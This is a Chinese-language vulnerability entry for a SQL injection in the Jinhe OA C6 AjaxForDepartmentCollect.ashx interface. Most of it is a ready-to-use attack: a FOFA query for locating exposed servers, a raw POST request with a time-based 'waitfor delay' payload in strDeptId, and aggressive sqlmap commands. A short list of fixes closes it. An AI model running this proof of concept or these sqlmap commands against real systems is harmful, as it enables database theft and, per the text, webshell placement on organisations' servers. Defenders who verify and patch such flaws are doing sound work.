# 金和OA AjaxForDepartmentCollect.ashx SQL注入漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 金和OA AjaxForDepartmentCollect.ashx SQL注入漏洞 |
| 漏洞类型 | SQL注入 |
| 组件 | 金和OA C6 / JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx |
| 影响版本 | 金和OA |

## 漏洞概述

金和网络是专业信息化服务商，为城市监管部门提供互联网+监管解决方案，为企事业单位提供组织协同OA系统开发平台等服务。金和OA C6 AjaxForDepartmentCollect.ashx 接口处存在SQL注入漏洞，攻击者可以利用SQL注入漏洞获取数据库中的信息（例如管理员后台密码、用户个人信息），甚至在高权限情况下可向服务器写入木马，获取服务器系统权限。

## 测绘语法

### FOFA
```sql
app="金和网络-金和OA"
```

## POC

### 原始请求包

```http
POST /C6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Content-Type: application/x-www-form-urlencoded
Cookie: ASP.NET_SessionId=r11tlou0h25eawqzrke52bpl
Content-Length: 97

method=getHistoryList&strDeptId=1;waitfor delay'0:0:4'--&strCollectType=Department&strYear=2012
```

### 漏洞特征

- 请求路径: `/C6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx`
- 请求方法: POST
- 参数: `strDeptId` 可注入
- 延迟: 4秒

### 检测方法

```bash
# 使用sqlmap检测
sqlmap -u "http://target/C6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx" \
  --data="method=getHistoryList&strDeptId=1&strCollectType=Department&strYear=2012" \
  --level=5 --risk=3

# 手工测试
sqlmap -u "http://target/C6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx" \
  --data="method=getHistoryList&strDeptId=1*&strCollectType=Department&strYear=2012"
```

## 漏洞修复

1. 联系厂商打补丁或升级版本
2. 增加Web应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限

---

**来源**: 实战安全研究 (2026-03-23)